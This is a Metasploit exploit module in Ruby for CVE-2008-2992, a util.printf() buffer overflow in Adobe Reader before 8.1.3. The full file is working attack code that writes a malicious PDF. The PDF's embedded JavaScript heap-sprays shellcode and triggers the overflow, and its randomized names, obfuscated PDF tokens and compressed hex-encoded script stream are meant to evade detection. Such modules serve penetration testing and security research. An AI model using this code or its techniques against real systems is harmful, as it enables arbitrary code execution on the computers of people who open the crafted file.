##
# $Id: adobe_utilprintf.rb 10477 2010-09-25 11:59:02Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe util.printf() Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Adobe Reader and Adobe Acrobat Professional
				< 8.1.3. By creating a specially crafted pdf that a contains malformed util.printf()
				entry, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC', 'Didier Stevens <didier.stevens[at]gmail.com>' ],
			'Version'        => '$Revision: 10477 $',
			'References'     =>
				[
					[ 'CVE', '2008-2992' ],
					[ 'OSVDB', '49520' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Adobe Reader v8.1.2 (Windows XP SP3 English)', { 'Ret' => '' } ],
				],
			'DisclosureDate' => 'Feb 8 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.pdf']),
			], self.class)
	end

	def exploit
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Make some nops
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Randomize variables
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)
		rand9  = rand_text_alpha(rand(100) + 1)
		rand10 = rand_text_alpha(rand(100) + 1)
		rand11 = rand_text_alpha(rand(100) + 1)

		script = %Q|
		var #{rand1} = unescape("#{shellcode}");
		var #{rand2} ="";
		for (#{rand3}=128;#{rand3}>=0;--#{rand3}) #{rand2} += unescape("#{nops}");
		#{rand4} = #{rand2} + #{rand1};
		#{rand5} = unescape("#{nops}");
		#{rand6} = 20;
		#{rand7} = #{rand6}+#{rand4}.length
		while (#{rand5}.length<#{rand7}) #{rand5}+=#{rand5};
		#{rand8} = #{rand5}.substring(0, #{rand7});
		#{rand9} = #{rand5}.substring(0, #{rand5}.length-#{rand7});
		while(#{rand9}.length+#{rand7} < 0x40000) #{rand9} = #{rand9}+#{rand9}+#{rand8};
		#{rand10} = new Array();
		for (#{rand11}=0;#{rand11}<1450;#{rand11}++) #{rand10}[#{rand11}] = #{rand9} + #{rand4};
		util.printf("%45000.45000f", 0);
					|

		# Create the pdf
		pdf = make_pdf(script)

		print_status("Creating '#{datastore['FILENAME']}' file...")

		file_create(pdf)
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end

	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end

	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end

	def make_pdf(js)

		xref = []
		eol = "\x0d\x0a"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<</Type/Catalog/Outlines ") << ioRef(2) << nObfu("/Pages ") << ioRef(3) << nObfu("/OpenAction ") << ioRef(5) << ">>" << endobj
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<</Type/Outlines/Count 0>>") << endobj
		xref << pdf.length
		pdf << ioDef(3) << nObfu("<</Type/Pages/Kids[") << ioRef(4) << nObfu("]/Count 1>>") << endobj
		xref << pdf.length
		pdf << ioDef(4) << nObfu("<</Type/Page/Parent ") << ioRef(3) << nObfu("/MediaBox[0 0 612 792]>>") << endobj
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<</Type/Action/S/JavaScript/JS ") + ioRef(6) + ">>" << endobj
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(6) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end
		pdf << "trailer" << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol
		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol
		pdf << "%%EOF" << eol

	end

end
